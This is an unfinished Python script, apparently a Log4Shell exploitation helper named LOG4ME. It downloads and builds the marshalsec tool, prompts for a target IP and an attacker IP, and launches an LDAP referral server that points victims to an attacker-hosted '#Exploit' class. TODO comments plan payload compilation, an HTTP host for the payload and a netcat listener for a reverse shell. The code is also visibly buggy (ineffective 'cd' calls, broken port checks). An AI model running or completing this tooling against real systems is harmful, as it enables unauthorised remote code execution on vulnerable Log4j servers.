##############
# LOG4ME
# EDUCATIONAL AND TESTING PURPOSES ONLY
# DON'T DO ILLEGAL SHIT PLEASE <3
##############

import os
from git import Repo


def movetomsec():
    os.system("cd marshalsec-master")


def buildmsec():
    # Updates package lists and gets maven from apt if not already there
    print("Checking for maven... ")
    os.system("sudo apt-get update")
    stream = os.popen("sudo apt-get install maven")
    print(stream.read())

    # moves into marshalsec folder to build
    os.system("cd marshalsec-master")

    print("Building...")

    # build marshalsec using maven (hopefully. probably wont work and you'll have to fucking fix it ahduifphapisfdhpai)
    buildresult = os.system("mvn clean package -DskipTests")
    if buildresult != 0:
        return "n"
    else:
        print("Marshalsec built.")
        marshalcheck = True
        return "y"


# function to get maven if not installed already, and then build marshalsec
# this fucking sucks btw, its just running system commands but i cant be fucked trying to learn how to build
# a shitting java package in python
# It also lets the program know if it built properly so ig that's a plus

def marshalsecinit():
    global marshalcheck

    # disclaimer please don't read this this fucking sucks but its the only way my monkey brain
    # can think of doing it

    marshalexist = os.listdir("./")
    marshalcheck = False
    for i in marshalexist:
        if i != "target":
            continue
        else:
            os.system("cd target")
            os.listdir("./")
            # STOP PUTTING THIS OFF
            break
    if not marshalcheck:

        print("Marshalsec does not exist, getting from source.")

        downloaded = False

        # get latest edition of marshalsec

        Repo.clone_from("https://github.com/mbechler/marshalsec", "./marshalsec")

        # check to validate that marshalsec was cloned successfully

        dirlist = os.listdir("./")

        for i in dirlist:
            if i != "marshalsec-master":
                downloaded = False
                continue
            else:
                downloaded = True
                print("Marshalsec downloaded!")
                buildsuccess = buildmsec()
                if buildsuccess == "y":
                    print("Built")
                return True

        if not downloaded:
            print("Marshalsec was not downloaded successfully, or the permissions in this directory are not configured "
                  "correctly. Please download it manually from http://https://github.com/mbechler/marshalsec , "
                  "or check your "
                  "permissions.")
            exit(69)

    else:
        print("Marshalsec is already here! Skipping build.")
        return True


def getip():
    ip = input("Please enter the ip address of the target.")
    return ip


def getport():

    port = input("Please enter the port if known. (default 80)")

    if port != 80:
        if port >> 99999 or port.isdigit() == False:
            print("Invalid port specification. Defaulting to 80.")
            port = 80
            return port
    else:
        port = port
        return port


# TODO start marshalsec

def marshalsecstart():

    counter = 0
    found = False

    if marshalsecinit() == True:
        movetomsec()

        #prints interfaces for convenience
        stream = os.popen("ip addr show")

        print(stream.read())

        #starts marshalsec

        attackerip = input("Please enter your attack machines IP address that corresponds to your chosen interface. "
                           "Shown above")
        command = f"java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http:// {attackerip} :8000/#Exploit' "

        os.system(command)


if marshalsecinit() == True:
    marshalsecstart()

# TODO COMMENT YA DAMN CODE

# TODO fix this fucking code, and also move from os to subprocess bc stack overflow says so

# TODO Add compiler for the java file, would also be nice to have it auto generate the exploit for you

# TODO Spin up http server for hosting the exploit

# TODO Find a way to make the netcat listener spawn in the same shell window as this script

# TODO die maybe
